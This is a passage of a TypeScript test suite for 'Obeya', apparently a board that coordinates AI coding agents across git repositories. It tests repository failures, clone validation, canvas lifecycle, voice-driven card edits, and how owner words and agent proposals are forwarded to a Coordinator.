    for (const a of [{ action: 'start' }, { action: 'message', text: 'Hallo' }, { action: 'approve' }] as CardAction[]) expect(refused(card.id, a)).toBe('repoDown');
    // nor does it become an idea, whose agent would read in another repository
    expect(() => canvas.patch(card.id, { state: 'idea' })).toThrow();
    expect(item(card.id).state).toBe('planned');
    // its time come, the card set to start later waits on
    canvas.wakeDue(Date.now() + 120_000);
    expect(item(later.id).snoozed).toBeDefined();
    await settle();
    expect(workers.sessions).toHaveLength(0);
    await canvas.apply({ name: 'Produkt', repos: both });
    expect(item(card.id).repoDown).toBeUndefined();
    canvas.act(card.id, { action: 'start' });
    await until(() => workers.sessions.length === 1);
    const api_ = canvas.repos.find((r) => r.ref.id === 'api')!;
    expect(workers.last.spec.cwd).toBe(api_.workspaces.leasedBy(card.id)!);
    canvas.wakeDue(Date.now() + 120_000);
    expect(item(later.id).snoozed).toBeUndefined();
  });

  test("a restart of all of Obeya that comes meanwhile is what the workers hear of; the repository's restart still goes", async () => {
    await open([{ path: web, settings: { land: 'pr' }, clones: 1 }]);
    const w = await atWork('web', 'W');
    canvas.restartDue({ reason: 'code', deadline: Date.now() + 60_000 });
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' }, clones: 2 }] });
    expect(w.session.inbox.at(-1)).toContain('new code landed on main');
    expect(w.session.inbox.join()).not.toContain("restart this repository's agents");
    expect(canvas.pendingRestart()?.repos).toEqual(['web']);
  });

  /** A clone of the repository at `of`, which a configuration may list as a workspace of it. */
  const cloneOf = (of: string, name: string) => {
    const path = join(dir, name);
    gitClone(of, path);
    return path;
  };

  test('a repository whose agents do not start as the configuration has them now works on as it was set up before, until they do', async () => {
    await open([{ path: web, settings: { land: 'pr' }, clones: 1 }]);
    const w = await atWork('web', 'W');
    const before = canvas.repos[0]!;
    const rev = canvas.board.canvas.configRev ?? 0;
    // a clone of another repository listed for it: its workspaces refuse it as it starts
    const wrong = cloneOf(api, 'x-api');
    const errors = quiet();
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' }, clones: 1, workspaces: [wrong] }] });
    w.session.emit({ type: 'idle' });
    await until(() => canvas.repos[0] !== before);
    errors.restore();
    expect(errors.lines.join('\n')).toContain(`the agents of ${web} do not start as the configuration has it now`);
    expect(canvas.board.canvas.repos.map((r) => r.id)).toEqual(['web']);
    expect(canvas.repos[0]!.workspaces.list().map((x) => x.path)).toEqual(before.workspaces.list().map((x) => x.path));
    expect(canvas.failures()).toEqual([{ canvas: 'produkt', repo: 'web', before: true, detail: expect.stringContaining(`${wrong} is not a clone of`) }]);
    expect(canvas.board.canvas.configRev).toBe(rev + 1);
    // its worker resumed where it paused
    expect(workers.last.spec.resume).toBe('sess-W');
    // a configuration it starts with: the failure goes
    const now = canvas.repos[0]!;
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' }, clones: 2 }] });
    workers.last.emit({ type: 'idle' });
    await until(() => canvas.repos[0] !== now);
    await until(() => canvas.repos[0]!.workspaces.list().length === 2);
    expect(canvas.failures()).toEqual([]);
    expect(canvas.board.canvas.configRev).toBe(rev + 2);
  });

  test('a repository that starts neither as configured now nor as before leaves the canvas, its cards kept; it starts again once it can', async () => {
    const own = cloneOf(api, 'x-own');
    await open([
      { path: web, settings: { land: 'pr' } },
      { path: api, settings: { land: 'pr' }, workspaces: [own] },
    ]);
    const a = await atWork('api', 'A');
    // the listed clone now belongs to another repository: the set-up before fails as well
    git(own, 'remote', 'set-url', 'origin', web);
    const errors = quiet();
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' } }, { path: api, settings: { land: 'pr' }, workspaces: [own], clones: 1 }] });
    a.session.emit({ type: 'idle' });
    await until(() => canvas.repos.length === 1);
    errors.restore();
    expect(errors.lines.join('\n')).toContain('nor as they were set up before');
    expect(canvas.board.canvas.repos.map((r) => r.id)).toEqual(['web']);
    expect(canvas.board.item(a.card.id)).toBeDefined();
    expect(canvas.failures()).toEqual([{ canvas: 'produkt', repo: 'api', detail: expect.stringContaining(`${own} is not a clone of`) }]);
    // its card shows that its repository does not run, and goes to no other's workers
    expect(item(a.card.id).repoDown).toBe(true);
    const sessions = workers.sessions.length;
    expect(refused(a.card.id, { action: 'message', text: 'Weiter' })).toBe('repoDown');
    expect(workers.sessions).toHaveLength(sessions);
    // the cause fixed, the configuration taken over again (a save, "Try again") starts it at once
    git(own, 'remote', 'set-url', 'origin', api);
    await canvas.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' } }, { path: api, settings: { land: 'pr' }, workspaces: [own], clones: 1 }] });
    expect(canvas.board.canvas.repos.map((r) => r.id)).toEqual(['web', 'api']);
    expect(canvas.repos[1]!.workspaces.list()).toHaveLength(2);
    expect(canvas.failures()).toEqual([]);
    // the card works again, in its own repository
    expect(item(a.card.id).repoDown).toBeUndefined();
    canvas.act(a.card.id, { action: 'message', text: 'Weiter' });
    await until(() => workers.sessions.length > sessions);
    expect(workers.last.spec.resume).toBe('sess-A');
    expect(workers.last.spec.cwd).toBe(canvas.repos[1]!.workspaces.leasedBy(a.card.id)!);
  });
});

describe('the canvases Obeya serves', () => {
  test("a canvas whose home repository does not start is left out, another repository that does not start leaves its canvas running; both are listed and start once they can", async () => {
    const web = repo('web', 'Web');
    const api = repo('api', 'API');
    const shop = repo('shop', 'Shop');
    // a clone listed for web and one listed for shop that belong to api: their workspaces refuse them
    const forWeb = join(dir, 'x-web');
    const forShop = join(dir, 'x-shop');
    gitClone(api, forWeb);
    gitClone(api, forShop);
    const configs = [
      { name: 'Web', repos: [{ path: web, settings: { land: 'pr' as const }, workspaces: [forWeb] }] },
      { name: 'API', repos: [{ path: api, settings: { land: 'pr' as const } }, { path: shop, settings: { land: 'pr' as const }, workspaces: [forShop] }] },
    ];
    const store = new Store(':memory:');
    const errors = quiet();
    const set = await startSet(configs, { store, home: dir, runtime: new FakeRuntime(), forge: noForge, restartIntervalMs: 5 });
    errors.restore();
    expect(set.all().map((c) => c.id)).toEqual(['api']);
    expect(set.get('api')!.board.canvas.repos.map((r) => r.id)).toEqual(['api']);
    expect(set.failures()).toEqual([
      { canvas: 'web', detail: expect.stringContaining(`${forWeb} is not a clone of`) },
      { canvas: 'api', repo: 'shop', detail: expect.stringContaining(`${forShop} is not a clone of`) },
    ]);
    // the causes fixed, the configuration taken over again (a save, "Try again"): both start
    git(forWeb, 'remote', 'set-url', 'origin', web);
    git(forShop, 'remote', 'set-url', 'origin', shop);
    await set.apply(configs, ['web', 'api']);
    expect(set.all().map((c) => c.id)).toEqual(['web', 'api']);
    expect(set.get('api')!.board.canvas.repos.map((r) => r.id)).toEqual(['api', 'shop']);
    expect(set.failures()).toEqual([]);
    // the home repository starts neither as configured now nor as before: the canvas stops, its cards kept
    const keep = set.get('web')!.board.create({ title: 'Bleibt', x: 0, y: 0 });
    let changes = 0;
    set.onChange(() => changes++);
    git(forWeb, 'remote', 'set-url', 'origin', api);
    const again = quiet();
    await set.apply([{ ...configs[0]!, repos: [{ ...configs[0]!.repos[0]!, clones: 1 }] }, configs[1]!], ['web', 'api']);
    await until(() => set.all().length === 1);
    again.restore();
    expect(set.all().map((c) => c.id)).toEqual(['api']);
    expect(changes).toBeGreaterThan(0);
    expect(set.failures()).toEqual([{ canvas: 'web', detail: expect.stringContaining(`${forWeb} is not a clone of`) }]);
    expect(again.lines.join('\n')).toContain('the home repository of the canvas web does not start; the canvas stopped');
    expect(store.cards('web').map((c) => c.id)).toContain(keep.id);
  });

  test('a canvas whose home repository leaves because its clones cannot be made stops, and nothing of it reads its repositories after', async () => {
    const web = repo('web', 'Web');
    const config = { name: 'Web', repos: [{ path: web, settings: { land: 'pr' as const, workspaces: 'clones' as const } }] };
    const set = await startSet([config], { store: new Store(':memory:'), home: dir, runtime: new FakeRuntime(), forge: noForge, restartIntervalMs: 5 });
    // where its clone goes, a link to nowhere: git makes no folder there. A folder's modes or access
    // list did not stop git for the administrator GitHub's Windows runners run as, nor would they root
    const clones = join(dir, 'workspaces', 'web');
    mkdirSync(clones, { recursive: true });
    symlinkSync(join(dir, 'nowhere'), join(clones, '1'), 'junction');
    const errors = quiet();
    try {
      await set.apply([{ ...config, repos: [{ ...config.repos[0]!, clones: 1 }] }], ['web']);
      await until(() => set.all().length === 0);
      await new Promise((r) => setTimeout(r, 5));
    } finally {
      errors.restore();
    }
    expect(set.failures()).toEqual([{ canvas: 'web', detail: expect.any(String) }]);
    expect(errors.lines.join('\n')).toContain('its clones cannot be made');
    expect(errors.lines.filter((l) => !l.includes('its clones cannot be made'))).toEqual([]);
  });

  test('a canvas new in the configuration starts at once, one moved in it moves in the list, one no longer in it stops, its cards kept', async () => {
    const web = repo('web', 'Web');
    const api = repo('api', 'API');
    const store = new Store(':memory:');
    const started: string[] = [];
    const set = await startSet([{ name: 'Web', repos: [{ path: web, settings: { land: 'pr' } }] }], { store, home: dir, runtime: new FakeRuntime(), forge: noForge, restartIntervalMs: 5 }, (c) => started.push(c.id));
    let changes = 0;
    set.onChange(() => changes++);
    const keep = set.get('web')!.board.create({ title: 'Bleibt', x: 0, y: 0 });
    await set.apply(
      [
        { name: 'Web', repos: [{ path: web, settings: { land: 'pr' } }] },
        { name: 'API', repos: [{ path: api, settings: { land: 'pr' } }] },
      ],
      ['web', 'api'],
    );
    expect(set.all().map((c) => c.id)).toEqual(['web', 'api']);
    expect(started).toEqual(['api']);
    // moved in the configuration: listed in its new order, nothing started again
    const before = changes;
    await set.apply(
      [
        { name: 'API', repos: [{ path: api, settings: { land: 'pr' } }] },
        { name: 'Web', repos: [{ path: web, settings: { land: 'pr' } }] },
      ],
      ['api', 'web'],
    );
    expect(set.all().map((c) => c.id)).toEqual(['api', 'web']);
    expect(started).toEqual(['api']);
    expect(changes).toBeGreaterThan(before);
    await set.apply([{ name: 'API', repos: [{ path: api, settings: { land: 'pr' } }] }], ['api']);
    // nobody at work on it: it stops at once
    expect(set.all().map((c) => c.id)).toEqual(['api']);
    expect(changes).toBeGreaterThan(1);
    expect(store.cards('web').map((c) => c.id)).toContain(keep.id);
  });
});

test('a clone registered for a repository must be one of it', async () => {
  const web = repo('web', 'Web');
  const api = repo('api', 'API');
  gitClone(api, join(dir, 'api-clone'));
  const deps = { store: new Store(':memory:'), home: dir, runtime: new FakeRuntime(), forge: noForge };
  expect(() => CanvasRuntime.start({ repos: [{ path: web, workspaces: [join(dir, 'api-clone')] }] }, deps)).toThrow('is not a clone of');
  // the repository itself counts too, though it has no origin (where work lands on its main, it stays out of the pool)
  canvas = await start({ repos: [{ path: api, settings: { land: 'pr' }, workspaces: [api, join(dir, 'api-clone')] }] }, deps);
  expect(canvas.repos[0]!.workspaces.list()).toHaveLength(2);
});

test('clones of the repository count as its own whether their origin is over https or ssh', async () => {
  const shop = repo('shop', 'Shop');
  git(shop, 'remote', 'add', 'origin', 'https://github.com/acme/shop.git');
  const clones = ['https', 'ssh', 'scp'].map((name) => {
    const path = join(dir, `shop-${name}`);
    gitClone(shop, path);
    return path;
  });
  git(clones[0]!, 'remote', 'set-url', 'origin', 'https://github.com/acme/shop');
  git(clones[1]!, 'remote', 'set-url', 'origin', 'ssh://git@github.com/acme/shop.git');
  git(clones[2]!, 'remote', 'set-url', 'origin', 'git@github.com:acme/shop.git');
  canvas = await start({ repos: [{ path: shop, workspaces: clones, settings: { land: 'pr' } }] }, { store: new Store(':memory:'), home: dir, runtime: new FakeRuntime(), forge: noForge });
  expect(canvas.repos[0]!.workspaces.list()).toHaveLength(3);
});

test('canvas ids read well', async () => {
  const c = await start({ name: 'Grüße & Maße', repos: [{ path: repo('g', 'G') }] }, { store: new Store(':memory:'), home: dir, runtime: new FakeRuntime(), forge: noForge });
  expect(c.id).toBe('grusse-masse');
});

test('a single repository keeps its canvas id and bare plan references', async () => {
  const only = repo('solo', 'Solo');
  const c = await start({ repos: [{ path: only }] }, { store: new Store(':memory:'), home: dir, runtime: new FakeRuntime(), forge: noForge });
  expect(c.board.canvas.id).toBe('solo');
  expect(c.board.snapshot().items.find((i) => i.kind === 'project')!.plan!.file).toBe('docs/plan/plan.md');
});

test('a canvas that stops reads no words the usage limit held and runs no command in its undo window; it does both once it runs again', async () => {
  const web = repo('web', 'Web');
  const s = new Store(':memory:');
  const deps = { store: s, home: dir, runtime, forge: noForge, commandDelayMs: 50, limitMargin: 10 };
  canvas = await start({ repos: [{ path: web, settings: { land: 'pr' } }] }, deps);
  const coordinators = () => runtime.sessions.filter((x) => x.spec.tools.some((t) => t.name === 'act'));
  const a = canvas.board.create({ title: 'Export', x: 0, y: 0, repo: 'web' });

  // a command in its undo window, and words the usage limit holds for 60 ms
  const started = canvas.commander.hear('starte Export', {});
  await settle();
  coordinators()[0]!.call('act', { actions: [{ do: 'start', card: `K${a.number}` }], confirm: '„Export“ startet.' });
  coordinators()[0]!.emit({ type: 'idle' });
  canvas.commander.arm((await started).token!);
  const held = canvas.commander.hear('was läuft?', {});
  await settle();
  coordinators()[0]!.emit({ type: 'error', message: "You've hit your session limit", limit: { resetsAt: Date.now() + 60 } });
  expect((await held).confirm).toStartWith('Das Nutzungslimit ist erreicht.');

  // the canvas stops (it left the configuration, say) before either is due
  await stop(canvas);
  await new Promise((r) => setTimeout(r, 200));
  expect(coordinators()).toHaveLength(1);
  expect(item(a.id).state).toBe('planned');
  // both are kept, as a restart leaves them
  expect(canvas.board.sheet.held().map((x) => x.said)).toEqual(['was läuft?']);
  expect(canvas.board.sheet.heldCommands()).toHaveLength(1);

  // the canvas runs again: it runs the command and reads the words
  canvas = await start({ repos: [{ path: web, settings: { land: 'pr' } }] }, deps);
  await until(() => coordinators().length === 2);
  expect(coordinators()[1]!.inbox.at(-1)).toContain('"was läuft?"');
  await until(() => item(a.id).state !== 'planned');
  expect(canvas.board.sheet.heldCommands()).toEqual([]);
});

test('what the owner writes in a card, or says to the Coordinator without one, reaches the learner', async () => {
  const web = repo('web', 'Web');
  canvas = await start({ repos: [{ path: web, settings: { land: 'pr' } }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge, writingPauseMs: 30 });
  const learners = () => runtime.withTool('propose');
  const done = async () => {
    learners().at(-1)!.emit({ type: 'idle' });
    await settle();
  };

  // a new card: what the owner typed, once they pause
  const a = canvas.board.create({ title: 'Export', x: 0, y: 0 });
  canvas.patch(a.id, { body: 'CSV' });
  canvas.patch(a.id, { body: 'CSV, Spalten immer mit Einheit.' });
  await settle();
  expect(learners()).toHaveLength(0);
  await new Promise((r) => setTimeout(r, 50));
  expect(learners()).toHaveLength(1);
  expect(learners()[0]!.inbox[0]).toContain("The owner's text of a card they wrote, the task for an agent: CSV, Spalten immer mit Einheit.");
  expect(learners()[0]!.inbox[0]).not.toContain('Before the owner wrote');
  await done();

  // a follow-up with a finding in it: at once when the owner acts on it, with the text it had before
  const b = canvas.board.create({ title: 'Datum', body: 'Befund: Datum fehlt.', from: a.id });
  canvas.patch(b.id, { body: 'Befund: Datum fehlt.\n\nImmer ISO-Datum.' });
  canvas.act(b.id, { action: 'planDoc' });
  await settle();
  expect(learners()).toHaveLength(2);
  expect(learners()[1]!.inbox[0]).toContain("Before the owner wrote in it, the card's text read:\nBefund: Datum fehlt.");
  await done();

  // typed back to what it was, or deleted while being written: nothing
  const c = canvas.board.create({ title: 'C', body: 'Alt.', x: 0, y: 0 });
  canvas.patch(c.id, { body: 'Neu.' });
  canvas.patch(c.id, { body: 'Alt.' });
  const d = canvas.board.create({ title: 'D', x: 0, y: 0 });
  canvas.patch(d.id, { body: 'Weg damit.' });
  canvas.remove(d.id);
  await new Promise((r) => setTimeout(r, 50));
  expect(learners()).toHaveLength(2);

  // the conversation with the Coordinator, without a card open
  const heard = canvas.commander.hear('Warum fragen die Agenten so viel?', {});
  await settle();
  runtime.last.call('reply', { confirm: 'Weil die Karten offen lassen, wie weit sie gehen sollen.' });
  runtime.last.emit({ type: 'idle' });
  await heard;
  await settle();
  expect(learners()).toHaveLength(3);
  // it reads the home repository's read tree, the default branch, not the checkout a card may have leased
  expect(learners()[2]!.spec.cwd).toBe(join(dir, 'read', 'web', 'web'));
  expect(learners()[2]!.inbox[0]).toContain('You replied: Weil die Karten offen lassen');
});

test('clicks in a card count towards the retrospective, and words the learner reads count once', async () => {
  await produkt();
  const count = () => canvas.board.setting('review_inputs');
  const a = canvas.board.create({ title: 'A', x: 0, y: 0 });
  canvas.press(a.id, { action: 'start' });
  expect(count()).toBe('1');
  await settle();
  canvas.press(a.id, { action: 'message', text: 'Bitte kleiner.' });
  expect(count()).toBe('2');
  // a spoken command is counted as what the owner said, not as a click besides
  canvas.act(a.id, { action: 'stop' });
  expect(count()).toBe('2');
  // a click that does not go through does not count
  expect(() => canvas.press(a.id, { action: 'dismiss' })).toThrow();
  expect(count()).toBe('2');
});

describe('where a spoken new card lands', () => {
  beforeEach(produkt);

  test('in view, at the place the owner was; without one, in what a page last had in view', async () => {
    canvas.board.create({ title: 'Far', x: 5000, y: 3000 });
    // clear of the canvas's projects, which stand at the origin
    const view = { x: 2000, y: 1000, w: 1200, h: 800 };
    const [w, h] = CARD_SIZE.task;
    const titled = (title: string) => canvas.board.snapshot().items.find((i) => i.title === title)!;
    await canvas.run({ do: 'newCard', title: 'Here', body: '', start: false, place: { x: 2400, y: 1300, view } });
    const here = titled('Here');
    expect([here.x, here.y]).toEqual([2400 - w / 2, 1300 - h / 2]);
    // under the pointer is taken now: the next goes beside it, still in view
    await canvas.run({ do: 'newCard', title: 'Next', body: '', start: false, place: { x: 2400, y: 1300, view } });
    const next = titled('Next');
    expect(next.x >= 2000 && next.y >= 1000 && next.x + w <= 3200 && next.y + h <= 1800).toBe(true);
    expect(Math.abs(next.x - here.x) >= w || Math.abs(next.y - here.y) >= h).toBe(true);
    canvas.inView = { x: -1400, y: 600, view: { x: -2000, y: 200, w: 1200, h: 800 } };
    await canvas.run({ do: 'newIdea', title: 'There', body: '' });
    const there = titled('There');
    expect([there.x, there.y]).toEqual([-1400 - w / 2, 600 - h / 2]);
  });
});

describe('groups by voice', () => {
  beforeEach(produkt);

  test('a command puts cards into a group by name, a new one or the one there is, takes them out, and renames it', async () => {
    const a = canvas.board.create({ title: 'A', x: 0, y: 0 });
    const b = canvas.board.create({ title: 'B', x: 400, y: 0 });
    await canvas.run({ do: 'group', cards: [a.id], name: 'Abrechnung' });
    await canvas.run({ do: 'group', cards: [b.id], name: 'abrechnung' });
    const [g] = canvas.board.snapshot().groups;
    expect([item(a.id).group, item(b.id).group]).toEqual([g!.id, g!.id]);
    await canvas.run({ do: 'renameGroup', group: g!.id, name: 'Billing' });
    await canvas.run({ do: 'ungroup', cards: [a.id] });
    expect(canvas.board.snapshot().groups).toEqual([{ ...g!, name: 'Billing' }]);
    expect(item(a.id).group).toBeUndefined();
  });
});

describe('merging and deleting planned tasks by voice', () => {
  beforeEach(produkt);

  test('a merge keeps the first card with a new title and every text; what pointed at the others points at it', async () => {
    const a = canvas.board.create({ title: 'Login error', body: 'The button shows on the wrong message.', x: 100, y: 200, repo: 'web' });
    const b = canvas.board.create({ title: 'Sign in again', body: 'Two buttons for one error.', x: 600, y: 200, repo: 'web' });
    const after = canvas.board.create({ title: 'After it', from: b.id });
    const review = canvas.board.create({ title: 'PR #5', x: 0, y: 900, repo: 'web' });
    const c: StoredContribution = { url: 'https://github.com/acme/app/pull/5', number: 5, author: 'amerlander', title: 'T', canModify: true, findings: [{ id: 1, title: 'F', text: 'T', status: 'later', card: b.id }] };
    canvas.board.work(review.id, { contribution: JSON.stringify(c) });
    const g = canvas.board.createGroup('Login', [a.id]);
    await canvas.run({ do: 'merge', card: a.id, others: [b.id], title: 'Sign in again: when and where' });
    expect(item(a.id)).toMatchObject({ title: 'Sign in again: when and where', x: 100, y: 200, group: g.id });
    expect(item(a.id).body).toBe('## Login error\n\nThe button shows on the wrong message.\n\n## Sign in again\n\nTwo buttons for one error.');
    expect(canvas.board.item(b.id)).toBeUndefined();
    expect(item(after.id).from).toBe(a.id);
    expect(item(review.id).contribution!.findings![0]!.card).toBe(a.id);
    expect(canvas.board.events(a.id).at(-1)!.text).toContain('„Sign in again“');
  });

  test("follow-up tasks waiting in the queue merge into one that waits for what they waited for, in the place of the first queued", async () => {
    const review = canvas.board.create({ title: 'PR #5', x: 0, y: 900, repo: 'web' });
    const ahead = canvas.board.create({ title: 'Ahead', x: 0, y: 1400, repo: 'web' });
    const a = canvas.board.create({ title: 'A', x: 0, y: 0, repo: 'web' });
    const b = canvas.board.create({ title: 'B', x: 400, y: 0, repo: 'web' });
    const behindB = canvas.board.create({ title: 'Behind B', x: 800, y: 0, repo: 'web' });
    const wait = (behind: string[], since: string, buildsOn?: string[]) => JSON.stringify({ behind, reason: 'Folgeaufgabe.', ...(buildsOn && { buildsOn }), since });
    canvas.board.work(ahead.id, { state: 'working' });
    canvas.board.work(a.id, { queue: wait([review.id], '2026-11-02T10:00:01.000Z', [review.id]) });
    canvas.board.work(b.id, { queue: wait([review.id, ahead.id], '2026-11-02T10:00:00.000Z', [review.id]) });
    canvas.board.work(behindB.id, { queue: wait([b.id], '2026-11-02T10:00:02.000Z') });
    await canvas.run({ do: 'merge', card: a.id, others: [b.id], title: 'A and B' });
    expect(item(a.id).queue).toEqual({ behind: [review.id, ahead.id], reason: 'Folgeaufgabe.', buildsOn: [review.id], since: '2026-11-02T10:00:00.000Z' });
    expect(item(behindB.id).queue).toMatchObject({ behind: [a.id] });
    await canvas.run({ do: 'delete', card: a.id });
    expect(canvas.board.item(a.id)).toBeUndefined();
  });

  test('both only on planned tasks nobody has worked on, a merge only within one repository', async () => {
    const a = canvas.board.create({ title: 'A', x: 0, y: 0, repo: 'web' });
    const b = canvas.board.create({ title: 'B', x: 400, y: 0, repo: 'web' });
    const other = canvas.board.create({ title: 'Elsewhere', x: 800, y: 0, repo: 'api' });
    const worked = canvas.board.create({ title: 'Stopped', x: 1200, y: 0, repo: 'web' });
    canvas.board.work(worked.id, { branch: 'obeya/stopped' });
    const code = (c: Parameters<CanvasRuntime['run']>[0]) => refusal(() => canvas.run(c));
    expect(code({ do: 'merge', card: a.id, others: [other.id], title: 'X' })).toBe('otherRepos');
    expect(code({ do: 'merge', card: a.id, others: [worked.id], title: 'X' })).toBe('notUntouched');
    expect(code({ do: 'delete', card: worked.id })).toBe('notUntouched');
    expect([item(a.id).title, item(other.id).title, item(worked.id).title]).toEqual(['A', 'Elsewhere', 'Stopped']);
    await canvas.run({ do: 'delete', card: b.id });
    expect(canvas.board.item(b.id)).toBeUndefined();
  });
});

describe("the owner's words on a card with an agent", () => {
  beforeEach(produkt);

  test('go straight to its worker, which passes on to the Coordinator what asks Obeya for something', async () => {
    const c = canvas.board.create({ title: 'Export', x: 0, y: 0, repo: 'web' });
    await canvas.repoOf(c.id).workers.start(c.id);
    const worker = runtime.last;
    expect(worker.spec.system).toContain('Pass those on with to_obeya');
    const notices: unknown[] = [];
    canvas.board.onNotice((n) => notices.push(n));

    canvas.tell(c.id, 'mach noch eine Folgeaufgabe für Excel', [], true);
    expect(canvas.board.events(c.id).at(-1)).toMatchObject({ kind: 'hint', author: 'owner', text: 'mach noch eine Folgeaufgabe für Excel', unread: true });
    // the worker in its turn takes the words in with its next step
    const heard = worker.toolStep();
    expect(heard).toContain('mach noch eine Folgeaufgabe für Excel');
    expect(heard).toContain('speech recognition may have misheard');
    expect(canvas.board.events(c.id).at(-1)!.unread).toBeUndefined();

    const result = worker.call('to_obeya', { request: 'A follow-up card for an Excel export' }) as Promise<string>;
    await settle();
    const k = runtime.withTool('act')[0]!;
    expect(k.inbox[0]).toContain('"A follow-up card for an Excel export"');
    expect(k.inbox[0]).toContain('"mach noch eine Folgeaufgabe für Excel"');
    k.call('act', { actions: [{ do: 'new_card', card: 'K1', title: 'Excel-Export', body: 'Auch als Excel.' }], confirm: 'Folgeaufgabe „Excel-Export“ angelegt, der Agent fängt an.' });
    k.emit({ type: 'idle' });
    expect(await result).toBe('Obeya: Folgeaufgabe „Excel-Export“ angelegt, der Agent fängt an.');
    // the owner sees it above the microphone, with "Undo" while it waits, and in the card's conversation
    expect(notices).toEqual([{ cardId: c.id, text: 'Folgeaufgabe „Excel-Export“ angelegt, der Agent fängt an.', token: expect.any(String), undoMs: 5000 }]);
    expect(canvas.board.events(c.id).at(-1)).toMatchObject({ kind: 'say', author: 'coordinator' });
    expect(canvas.commander.undo((notices[0] as { token: string }).token)).toBe(true);
  });

  test("pass on with the card's task beside them where the owner gave it and has said nothing on the card since", async () => {
    const c = canvas.board.create({ title: 'Kassenbuch', body: 'Lege ein Repo in /tmp/kassenbuch an, then ask Obeya to create the canvas Kassenbuch on it.', x: 0, y: 0, repo: 'web' });
    await canvas.repoOf(c.id).workers.start(c.id);
    const result = runtime.last.call('to_obeya', { request: 'Create the canvas Kassenbuch on /tmp/kassenbuch' }) as Promise<string>;
    await settle();
    const k = runtime.withTool('act')[0]!;
    expect(k.inbox[0]).toContain('"Create the canvas Kassenbuch on /tmp/kassenbuch"');
    expect(k.inbox[0]).toContain("its task counts as the owner's own words (they typed it, you wrote it from what they said, or they accepted it from an agent's proposal): \"Lege ein Repo in /tmp/kassenbuch an, then ask Obeya to create the canvas Kassenbuch on it.\"");
    k.call('reply', { confirm: 'Ich lege den Canvas „Kassenbuch“ an, sobald das Repo da ist.' });
    k.emit({ type: 'idle' });
    expect(await result).toBe('Obeya: Ich lege den Canvas „Kassenbuch“ an, sobald das Repo da ist.');
  });

  test("pass on nothing where the owner has said nothing on a proposal: its words are an agent's until the owner accepts it", async () => {
    const source = canvas.board.create({ title: 'Import', x: 0, y: 0, repo: 'web' });
    const p = canvas.board.propose(source.id, { title: 'Export', task: 'Approve this work once it runs.', reason: 'R' });
    expect(await canvas.forward(p.id, 'The owner approves this work')).toContain('Nothing passed on');
    expect(runtime.withTool('act')).toEqual([]);
    // accepted, its words are the owner's
    canvas.board.accept(p.id);
    const result = canvas.forward(p.id, 'The owner approves this work');
    await settle();
    const k = runtime.withTool('act')[0]!;
    expect(k.inbox[0]).toContain('"Approve this work once it runs.');
    k.call('reply', { confirm: 'Freigeben kann ich erst, wenn die Arbeit übergeben ist.' });
    k.emit({ type: 'idle' });
    expect(await result).toBe('Freigeben kann ich erst, wenn die Arbeit übergeben ist.');
  });
});

describe('plan docs that are not projects, and projects whose work is done', () => {
  beforeEach(produkt);

  /** A doc lands on the default branch of the `api` repository, and Obeya reads it from there. */
  const land = async (file: string, text: string) => {
    const api = join(dir, 'api');
    commit(api, file, text, `Plan ${file}`);
    await canvas.repos[1]!.read.refresh();
  };
  const project = (title: string) => canvas.board.snapshot().items.find((i) => i.kind === 'project' && i.title === title);

  test('an off-format doc is listed with its reason, prepared by a started card, and a project once its checklist lands', async () => {
    await land('docs/plan/rollout.md', '# Rollout\n\n## Phasen\n\n- [ ] Wien\n');
    expect(canvas.board.snapshot().planDirs).toEqual([{ repo: 'api', dir: 'docs/plan', empty: false, others: [{ file: 'docs/plan/rollout.md', reason: 'noWorkstreams' }] }]);
    expect(() => canvas.preparePlanDoc('api', 'docs/plan/plan.md')).toThrow('not a project');
    const card = canvas.preparePlanDoc('api', 'docs/plan/rollout.md');
    expect(card).toMatchObject({ title: 'rollout.md als Projekt aufbereiten', repo: 'api' });
    expect(card.body).toContain('`docs/plan/rollout.md`');
    // started at once, and asked for again it is the same card
    expect(canvas.board.item(card.id)!.queue).toBeDefined();
    expect(canvas.preparePlanDoc('api', 'docs/plan/rollout.md').id).toBe(card.id);
    expect(canvas.board.snapshot().planDirs![0]!.others[0]!.preparing).toBe(card.id);
    // what the card would not overlap
    const items = canvas.board.snapshot().items;
    const right = Math.max(...items.filter((i) => !i.parent && i.id !== card.id).map((i) => { const b = boundsOf(i, items); return b.x + b.w; }));
    expect(canvas.board.item(card.id)!.x).toBeGreaterThan(right);

    await land('docs/plan/rollout.md', '# Rollout\n\n## Ziel\n\nÖsterreich.\n\n## Workstreams\n\n- [ ] **W1:** Wien.\n');
    expect(project('Rollout')).toMatchObject({ repo: 'api', plan: { file: 'api:docs/plan/rollout.md', goal: 'Österreich.' } });
    expect(canvas.board.snapshot().planDirs).toBeUndefined();
  });

  test('a project is done once every workstream is ticked on the default branch, goes into the archive by the owner, and comes back with an open one', async () => {
    const before = project('API')!;
    await land('docs/plan/plan.md', '# API\n\n## Goal\n\nG.\n\n## Workstreams\n\n- [x] **W1:** Erster Schritt.\n');
    expect(project('API')).toMatchObject({ id: before.id, state: 'done' });
    canvas.board.archive([before.id]);
    expect(project('API')).toBeUndefined();
    expect(canvas.board.archived.all().map((i) => i.title)).toEqual(['API', 'Erster Schritt']);
    await land('docs/plan/plan.md', '# API\n\n## Goal\n\nG.\n\n## Workstreams\n\n- [x] **W1:** Erster Schritt.\n- [ ] **W2:** Zweiter.\n');
    expect(project('API')).toMatchObject({ id: before.id, x: before.x, y: before.y });
    expect(canvas.board.archived.all()).toEqual([]);
  });
});

test("pausing a canvas's agents pauses each at work, holds the cards let start meanwhile, and resuming lets all go on", async () => {
  const c = await start({ name: 'Pause', repos: [{ path: repo('solo', 'Solo'), clones: 2 }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge });
  const a = c.board.create({ title: 'A', x: 0, y: 0 });
  await c.repos[0]!.workers.start(a.id);
  const worker = runtime.sessions.at(-1)!;
  worker.emit({ type: 'session', id: 's-a' });
  worker.emit({ type: 'text', text: 'Arbeite.' });
  await heard();
  expect(c.board.canvas.agents).toEqual({ running: 1, paused: 0 });
  c.pauseAgents();
  await heard();
  // as the card's own pause: it brings its work to a safe point first, and counts as paused meanwhile
  expect(worker.closed).toBe(false);
  expect(worker.inbox.at(-1)).toContain('The owner pauses you now');
